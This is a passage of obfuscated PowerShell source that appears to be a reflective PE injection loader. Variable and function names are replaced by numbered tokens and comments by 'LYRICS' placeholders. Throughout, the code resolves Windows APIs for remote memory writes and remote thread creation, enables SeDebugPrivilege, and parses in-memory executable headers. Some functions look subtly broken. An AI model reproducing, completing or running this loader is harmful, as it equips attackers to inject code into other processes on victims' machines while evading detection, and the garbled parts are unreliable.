            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST016 -Value 0x20000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST017 -Value 0x40000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST018 -Value 0x80000000
# LYRICS204
# LYRICS205
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST019 -Value 0x04000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST020 -Value 0x4000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST021 -Value 0x0002
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST022 -Value 0x2000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST023 -Value 0x40
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST024 -Value 0x100
# LYRICS206
# LYRICS207
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST025 -Value 0x8000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST026 -Value 0x0008
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST027 -Value 0x0020
# LYRICS208
# LYRICS209
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST028 -Value 0x2
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST029 -Value 0x3f0
# LYRICS210
            return $VAR0041
        }
# LYRICS211
        Function FUN003 {
# LYRICS212
# LYRICS213
            $VAR0042 = New-Object System.Object
# LYRICS214
            $VAR0043 = FUN012 $VAR0302 $VAR0315
            $VAR0044 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
# LYRICS215
# LYRICS216
            $VAR0045 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0043, $VAR0044)
            $VAR0042 | Add-Member NoteProperty -Name FUN031 -Value $VAR0045
# LYRICS217
            $VAR0046 = FUN012 $VAR0302 $VAR0318
            $VAR0047 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
# LYRICS218
            $VAR0048 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0046, $VAR0047)
# LYRICS219
# LYRICS220
            $VAR0042 | Add-Member NoteProperty -Name FUN032 -Value $VAR0048
# LYRICS221
            $VAR0049 = FUN012 $VAR0309 memcpy
            $VAR0050 = FUN011 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
            $VAR0051 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0049, $VAR0050)
# LYRICS222
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN033 -Value $VAR0051
# LYRICS223
            $VAR0052 = FUN012 $VAR0309 memset
            $VAR0053 = FUN011 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
# LYRICS224
            $VAR0054 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0052, $VAR0053)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN034 -Value $VAR0054
# LYRICS225
# LYRICS226
            $VAR0055 = FUN012 $VAR0302 $VAR0329
            $VAR0056 = FUN011 @([String]) ([IntPtr])
# LYRICS227
            $VAR0057 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0055, $VAR0056)
# LYRICS228
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN035 -Value $VAR0057
# LYRICS229
            $VAR0058 = FUN012 $VAR0302 $VAR0312
# LYRICS230
            $VAR0059 = FUN011 @([IntPtr], [String]) ([IntPtr])
            $VAR0060 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0058, $VAR0059)
# LYRICS231
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN036 -Value $VAR0060
# LYRICS232
            $VAR0061 = FUN012 $VAR0302 $VAR0312 
            $VAR0062 = FUN011 @([IntPtr], [IntPtr]) ([IntPtr])
# LYRICS233
            $VAR0063 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0061, $VAR0062)
# LYRICS234
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN037 -Value $VAR0063
# LYRICS235
            $VAR0064 = FUN012 $VAR0302 VirtualFree
            $VAR0065 = FUN011 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
            $VAR0066 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0064, $VAR0065)
# LYRICS236
# LYRICS237
            $VAR0042 | Add-Member NoteProperty -Name FUN038 -Value $VAR0066
# LYRICS238
            $VAR0067 = FUN012 $VAR0302 VirtualFreeEx
# LYRICS239
            $VAR0068 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
            $VAR0069 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0067, $VAR0068)
# LYRICS240
            $VAR0042 | Add-Member NoteProperty -Name FUN039 -Value $VAR0069
# LYRICS241
            $VAR0070 = FUN012 $VAR0302 VirtualProtect
# LYRICS242
            $VAR0071 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
# LYRICS243
            $VAR0072 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0070, $VAR0071)
            $VAR0042 | Add-Member NoteProperty -Name FUN040 -Value $VAR0072
# LYRICS244
            $VAR0073 = FUN012 $VAR0302 GetModuleHandleA
# LYRICS245
            $VAR0074 = FUN011 @([String]) ([IntPtr])
# LYRICS246
            $VAR0075 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0073, $VAR0074)
            $VAR0042 | Add-Member NoteProperty -Name FUN041 -Value $VAR0075
# LYRICS247
            $VAR0076 = FUN012 $VAR0302 FreeLibrary
# LYRICS248
            $VAR0077 = FUN011 @([IntPtr]) ([Bool])
            $VAR0078 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0076, $VAR0077)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN042 -Value $VAR0078
# LYRICS249
            $VAR0079 = FUN012 $VAR0302 OpenProcess
# LYRICS250
            $VAR0080 = FUN011 @([UInt32], [Bool], [UInt32]) ([IntPtr])
            $VAR0081 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0079, $VAR0080)
# LYRICS251
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN043 -Value $VAR0081
# LYRICS252
            $VAR0082 = FUN012 $VAR0302 WaitForSingleObject
            $VAR0083 = FUN011 @([IntPtr], [UInt32]) ([UInt32])
            $VAR0084 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0082, $VAR0083)
# LYRICS253
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN044 -Value $VAR0084
# LYRICS254
            $VAR0085 = FUN012 $VAR0302 WriteProcessMemory
            $VAR0086 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
# LYRICS255
            $VAR0087 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0085, $VAR0086)
# LYRICS256
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN045 -Value $VAR0087
# LYRICS257
            $VAR0088 = FUN012 $VAR0302 ReadProcessMemory
# LYRICS258
            $VAR0089 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $VAR0090 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0088, $VAR0089)
# LYRICS259
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN046 -Value $VAR0090
# LYRICS260
            $VAR0091 = FUN012 $VAR0302 CreateRemoteThread
# LYRICS261
            $VAR0092 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
            $VAR0093 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0091, $VAR0092)
# LYRICS262
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN047 -Value $VAR0093
# LYRICS263
            $VAR0094 = FUN012 $VAR0302 GetExitCodeThread
# LYRICS264
# LYRICS265
            $VAR0095 = FUN011 @([IntPtr], [Int32].MakeByRefType()) ([Bool])
# LYRICS266
            $VAR0096 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0094, $VAR0095)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN048 -Value $VAR0096
# LYRICS267
            $VAR0097 = FUN012 $VAR0306 OpenThreadToken
# LYRICS268
            $VAR0098 = FUN011 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
            $VAR0099 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0097, $VAR0098)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN049 -Value $VAR0099
# LYRICS269
            $VAR0100 = FUN012 $VAR0302 GetCurrentThread
# LYRICS270
            $VAR0101 = FUN011 @() ([IntPtr])
# LYRICS271
            $VAR0102 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0100, $VAR0101)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN050 -Value $VAR0102
# LYRICS272
            $VAR0103 = FUN012 $VAR0306 AdjustTokenPrivileges
# LYRICS273
            $VAR0104 = FUN011 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
            $VAR0105 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0103, $VAR0104)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN051 -Value $VAR0105
# LYRICS274
            $VAR0106 = FUN012 $VAR0306 LookupPrivilegeValueA
# LYRICS275
            $VAR0107 = FUN011 @([String], [String], [IntPtr]) ([Bool])
# LYRICS276
            $VAR0108 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0106, $VAR0107)
# LYRICS277
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN052 -Value $VAR0108
# LYRICS278
            $VAR0109 = FUN012 $VAR0306 ImpersonateSelf
            $VAR0110 = FUN011 @([Int32]) ([Bool])
# LYRICS279
            $VAR0111 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0109, $VAR0110)
# LYRICS280
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN053 -Value $VAR0111
# LYRICS281
# LYRICS282
            if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6, 0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6, 2))) {
# LYRICS283
                $VAR0112 = FUN012 NtDll.dll NtCreateThreadEx
# LYRICS284
                $VAR0113 = FUN011 @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
                $VAR0114 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0112, $VAR0113)
# LYRICS285
                $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN054 -Value $VAR0114
            }
# LYRICS286
            $VAR0115 = FUN012 $VAR0302 IsWow64Process
# LYRICS287
            $VAR0116 = FUN011 @([IntPtr], [Bool].MakeByRefType()) ([Bool])
            $VAR0117 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0115, $VAR0116)
# LYRICS288
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN055 -Value $VAR0117
# LYRICS289
            $VAR0118 = FUN012 $VAR0302 CreateThread
# LYRICS290
            $VAR0119 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
# LYRICS291
            $VAR0120 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0118, $VAR0119)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN056 -Value $VAR0120
# LYRICS292
            return $VAR0042
        }
# LYRICS293
# LYRICS294
# LYRICS295
# LYRICS296
        Function FUN004 {
# LYRICS297
# LYRICS298
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $VAR0121,
# LYRICS299
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0122
            )
# LYRICS300
            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
# LYRICS301
            [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)
# LYRICS302
            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
                $VAR0124 = 0
# LYRICS303
                for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
# LYRICS304
# LYRICS305
                    $Val = $VAR0121Bytes[$i] - $VAR0124
# LYRICS306
                    if ($Val -lt $VAR0122Bytes[$i]) {
                        $Val += 256
# LYRICS307
                        $VAR0124 = 1
                    }
                    else {
# LYRICS308
                        $VAR0124 = 0
                    }
# LYRICS309
# LYRICS310
                    [UInt16]$Sum = $Val - $VAR0122Bytes[$i]
# LYRICS311
                    $VAR0123[$i] = $Sum -band 0x00FF
# LYRICS312
                }
            }
            else {
                Throw "ERROR01"
            }
# LYRICS313
            return [BitConverter]::ToInt64($VAR0123, 0)
        }
# LYRICS314
        Function FUN005 {
# LYRICS315
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $VAR0121,
# LYRICS316
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0122
            )
# LYRICS317
            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
# LYRICS318
            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
            [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)
# LYRICS319
            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
# LYRICS320
                $VAR0124 = 0
                for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
# LYRICS321
# LYRICS322
                    [UInt16]$Sum = $VAR0121Bytes[$i] + $VAR0122Bytes[$i] + $VAR0124
# LYRICS323
                    $VAR0123[$i] = $Sum -band 0x00FF
# LYRICS324
                    if (($Sum -band 0xFF00) -eq 0x100) {
# LYRICS325
                        $VAR0124 = 1
                    }
                    else {
# LYRICS326
                        $VAR0124 = 0
                    }
                }
            }
            else {
                Throw "ERROR02"
            }
# LYRICS327
            return [BitConverter]::ToInt64($VAR0123, 0)
        }
# LYRICS328
        Function FUN006 {
# LYRICS329
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $VAR0121,
# LYRICS330
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0122
            )
# LYRICS331
            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
# LYRICS332
            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
# LYRICS333
            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
                for ($i = $VAR0121Bytes.Count - 1; $i -ge 0; $i--) {
# LYRICS334
                    if ($VAR0121Bytes[$i] -gt $VAR0122Bytes[$i]) {
# LYRICS335
                        return $true
                    }
                    elseif ($VAR0121Bytes[$i] -lt $VAR0122Bytes[$i]) {
# LYRICS336
                        return $false
                    }
                }
            }
            else {
                Throw "ERROR03"
            }
# LYRICS337
            return $false
        }
# LYRICS338
# LYRICS339
        Function FUN007 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [UInt64]
# LYRICS340
                $VAR0123
            )
# LYRICS341
            [Byte[]]$VAR0123Bytes = [BitConverter]::GetBytes($VAR0123)
# LYRICS342
            return ([BitConverter]::ToInt64($VAR0123Bytes, 0))
        }
# LYRICS343
# LYRICS344
        Function FUN008 {
# LYRICS345
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                $VAR0123 
            )
# LYRICS346
            $VAR0123Size = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR0123.GetType()) * 2
# LYRICS347
            $VAR0124 = "0x{0:X$($VAR0123Size)}" -f [Int64]$VAR0123 
# LYRICS348
            return $VAR0124
        }
# LYRICS349
        Function FUN009 {
# LYRICS350
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [String]
                $VAR0125,
# LYRICS351
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS352
                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $VAR0127,
# LYRICS353
                [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
                [IntPtr]
                $Size
            )
# LYRICS354
            [IntPtr]$VAR0128 = [IntPtr](FUN005 ($VAR0127) ($Size))
# LYRICS355
# LYRICS356
            $VAR0128 = $VAR0126.CONST038
# LYRICS357
# LYRICS358
        }
# LYRICS359
        Function FUN010 {
# LYRICS360
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Byte[]]
                $Bytes,
# LYRICS361
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0129
            )
# LYRICS362
            for ($VAR0130 = 0; $VAR0130 -lt $Bytes.Length; $VAR0130++) {
# LYRICS363
                [System.Runtime.InteropServices.Marshal]::WriteByte($VAR0129, $VAR0130, $Bytes[$VAR0130])
            }
        }
# LYRICS364
# LYRICS365
        Function FUN011 {
# LYRICS366
            Param
            (
                [OutputType([Type])]
# LYRICS367
                [Parameter( Position = 0)]
                [Type[]]
                $Parameters = (New-Object Type[](0)),
# LYRICS368
                [Parameter( Position = 1 )]
                [Type]
                $ReturnType = [Void]
            )
# LYRICS369
            $Domain = [AppDomain]::CurrentDomain
            $VAR0131 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
# LYRICS370
            $VAR013 = $Domain.DefineDynamicAssembly($VAR0131, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $VAR014 = $VAR013.DefineDynamicModule('InMemoryModule', $false)
            $VAR011 = $VAR014.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
# LYRICS371
            $VAR0132 = $VAR011.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
            $VAR0132.SetImplementationFlags('Runtime, Managed')
# LYRICS372
            $VAR0133 = $VAR011.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
# LYRICS373
            $VAR0133.SetImplementationFlags('Runtime, Managed')
# LYRICS374
            Write-Output $VAR011.CreateType()
        }
# LYRICS375
# LYRICS376
# LYRICS377
        Function FUN012 {
# LYRICS378
            Param
            (
                [OutputType([IntPtr])]
# LYRICS379
                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                $Module,
# LYRICS380
                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                $VAR0139
            )
# LYRICS381
# LYRICS382
            $VAR0134 = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
# LYRICS383
            $VAR0135 = $VAR0134.GetType('Microsoft.Win32.UnsafeNativeMethods')
# LYRICS384
# LYRICS385
            $VAR0075 = $VAR0135.GetMethod('GetModuleHandle')
# LYRICS386
            $VAR0060 = $VAR0135.GetMethods() | Where { $_.Name -eq $VAR0312 } | Select-Object -first 1
# LYRICS387
# LYRICS388
            $VAR0136 = $VAR0075.Invoke($null, @($Module))
# LYRICS389
# LYRICS390
            try {
                $VAR0137 = New-Object IntPtr
                $VAR0138 = New-Object System.Runtime.InteropServices.HandleRef($VAR0137, $VAR0136)
# LYRICS391
                Write-Output $VAR0060.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$VAR0138, $VAR0139))
            }
            catch {
# LYRICS392
                Write-Output $VAR0060.Invoke($null, @($VAR0136, $VAR0139))
# LYRICS393
            }
        }
# LYRICS394
        Function FUN013 {
# LYRICS395
            Param(
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS396
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR010,
# LYRICS397
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR0041
            )
# LYRICS398
            [IntPtr]$VAR0141 = $VAR0042.FUN050.Invoke()
# LYRICS399
            if ($VAR0141 -eq [IntPtr]::Zero) {
# LYRICS400
                Throw "ERROR03"
            }
# LYRICS401
            [IntPtr]$VAR0142 = [IntPtr]::Zero
# LYRICS402
            [Bool]$VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
# LYRICS403
            if ($VAR0144 -eq $false) {
                $VAR0148 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
# LYRICS404
                if ($VAR0148 -eq $VAR0041.CONST029) {
# LYRICS405
                    $VAR0144 = $VAR0042.FUN053.Invoke(3)
# LYRICS406
                    if ($VAR0144 -eq $false) {
                        Throw "ERROR04"
                    }
# LYRICS407
                    $VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
# LYRICS408
                    if ($VAR0144 -eq $false) {
                        Throw "ERROR05"
                    }
                }
                else {
                    Throw "ERROR06: $VAR0148"
                }
            }
# LYRICS409
            [IntPtr]$VAR0143 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST163))
# LYRICS410
            $VAR0144 = $VAR0042.FUN052.Invoke($null, "SeDebugPrivilege", $VAR0143)
# LYRICS411
            if ($VAR0144 -eq $false) {
                Throw "ERROR07"
            }
# LYRICS412
            [UInt32]$VAR0145 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST167)
# LYRICS413
            [IntPtr]$VAR0146 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0145)
            $VAR0147 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0146, [Type]$VAR010.CONST167)
# LYRICS414
            $VAR0147.CONST168 = 1
            $VAR0147.CONST169.CONST163 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0143, [Type]$VAR010.CONST163)
# LYRICS415
            $VAR0147.CONST169.Attributes = $VAR0041.CONST028
# LYRICS416
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0147, $VAR0146, $true)
# LYRICS417
            $VAR0144 = $VAR0042.FUN051.Invoke($VAR0142, $false, $VAR0146, $VAR0145, [IntPtr]::Zero, [IntPtr]::Zero)
# LYRICS418
            $VAR0148 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
# LYRICS419
# LYRICS420
            if (($VAR0144 -eq $false) -or ($VAR0148 -ne 0)) {
# LYRICS421
            }
# LYRICS422
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0146)
        }
# LYRICS423
        Function FUN014 {
# LYRICS424
            Param(
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0151,
# LYRICS425
                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $VAR0127,
# LYRICS426
                [Parameter(Position = 3, Mandatory = $false)]
                [IntPtr]
                $VAR0152 = [IntPtr]::Zero,
# LYRICS427
                [Parameter(Position = 4, Mandatory = $true)]
                [System.Object]
                $VAR0042
            )
# LYRICS428
            [IntPtr]$VAR0149 = [IntPtr]::Zero
# LYRICS429
            $VAR0150 = [Environment]::OSVersion.Version
# LYRICS430
# LYRICS431
            if (($VAR0150 -ge (New-Object 'Version' 6, 0)) -and ($VAR0150 -lt (New-Object 'Version' 6, 2))) {
# LYRICS432
# LYRICS433
                $RetVal = $VAR0042.FUN054.Invoke([Ref]$VAR0149, 0x1FFFFF, [IntPtr]::Zero, $VAR0151, $VAR0127, $VAR0152, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
# LYRICS434
# LYRICS435
                $VAR0153 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
# LYRICS436
                if ($VAR0149 -eq [IntPtr]::Zero) {
# LYRICS437
                    Throw "ERROR63: $RetVal. $VAR0153"
                }
            }
# LYRICS438
            else {
# LYRICS439
                $VAR0149 = $VAR0042.FUN047.Invoke($VAR0151, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $VAR0127, $VAR0152, 0, [IntPtr]::Zero)
            }
# LYRICS440
            if ($VAR0149 -eq [IntPtr]::Zero) {
# LYRICS441
                Write-Error "ERROR64" -ErrorAction Stop
            }
# LYRICS442
            return $VAR0149
        }
# LYRICS443
        Function FUN015 {
# LYRICS444
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263,
# LYRICS445
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS446
            $VAR0154 = New-Object System.Object
# LYRICS447
# LYRICS448
            $VAR0155 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0263, [Type]$VAR010.CONST123)
# LYRICS449
# LYRICS450
            [IntPtr]$VAR0156 = [IntPtr](FUN005 ([Int64]$VAR0263) ([Int64][UInt64]$VAR0155.CONST141))
# LYRICS451
            $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST030 -Value $VAR0156
# LYRICS452
            $VAR0157 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0156, [Type]$VAR010.CONST03164)
# LYRICS453
# LYRICS454
            if ($VAR0157.Signature -ne 0x00004550) {
                throw "ERROR65"
            }
# LYRICS455
            if ($VAR0157.CONST122.Magic -eq 'CONST101') {
# LYRICS456
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0157
# LYRICS457
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $true
            }
            else {
                $VAR0158 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0156, [Type]$VAR010.CONST03132)
# LYRICS458
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0158
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $false
            }
# LYRICS459
            return $VAR0154
        }
# LYRICS460
# LYRICS461
# LYRICS462
        Function FUN016 {
# LYRICS463
            Param(
                [Parameter( Position = 0, Mandatory = $true )]
                [Byte[]]
                $VAR001,
# LYRICS464
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS465
            $VAR0126 = New-Object System.Object
# LYRICS466
# LYRICS467
            [IntPtr]$VAR0159 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR001.Length)
# LYRICS468
            [System.Runtime.InteropServices.Marshal]::Copy($VAR001, 0, $VAR0159, $VAR001.Length) | Out-Null
# LYRICS469
# LYRICS470
            $VAR0154 = FUN015 -VAR0263 $VAR0159 -VAR010 $VAR010
# LYRICS471
# LYRICS472
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST032' -Value ($VAR0154.CONST032)
# LYRICS473
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'VAR0196' -Value ($VAR0154.CONST031.CONST122.CONST058)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
# LYRICS474
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST034' -Value ($VAR0154.CONST031.CONST122.CONST034)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST035' -Value ($VAR0154.CONST031.CONST122.CONST035)
# LYRICS475
# LYRICS476
# LYRICS477
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0159)
# LYRICS478
            return $VAR0126
        }
# LYRICS479
# LYRICS480
# LYRICS481
# LYRICS482
        Function FUN017 {
# LYRICS483
            Param(
                [Parameter( Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263,
# LYRICS484
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR010,
# LYRICS485
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041
            )
# LYRICS486
            if ($VAR0263 -eq $null -or $VAR0263 -eq [IntPtr]::Zero) {
# LYRICS487
                throw 'ERROR66'
            }
# LYRICS488
            $VAR0126 = New-Object System.Object
# LYRICS489
# LYRICS490
            $VAR0154 = FUN015 -VAR0263 $VAR0263 -VAR010 $VAR010
# LYRICS491
# LYRICS492
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'VAR0263' -Value $VAR0263
# LYRICS493
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST031' -Value ($VAR0154.CONST031)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST1000' -Value ($VAR0154.CONST030) 
# LYRICS494
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST032' -Value ($VAR0154.CONST032)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
# LYRICS495
            if ($VAR0126.CONST032 -eq $true) {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST1000) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03164)))
# LYRICS496
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
            }
            else {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST1000) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03132)))
# LYRICS497
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
            }
